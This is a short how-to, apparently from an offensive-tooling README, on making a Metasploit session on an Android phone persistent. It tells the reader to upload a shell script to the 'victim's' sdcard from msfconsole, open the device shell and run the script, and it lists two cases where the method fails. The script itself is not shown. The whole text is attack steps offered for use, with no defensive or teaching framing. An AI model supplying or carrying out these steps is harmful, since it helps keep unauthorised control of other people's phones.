# Persistent
Steps 
>Upload this in your victims sdcard by the following command in msfconsole after the session has been opened.
upload /path/to/shell.sh /sdcard
Access device shell by command
shell
Wait for it to connect
Change directory to sdcard by command
cd sdcard
Run the shell script by command
shell.sh
voila

Note that this does not work when
>The app is hidden from launcher by command hide_app_icon
>When the payload is embedded.
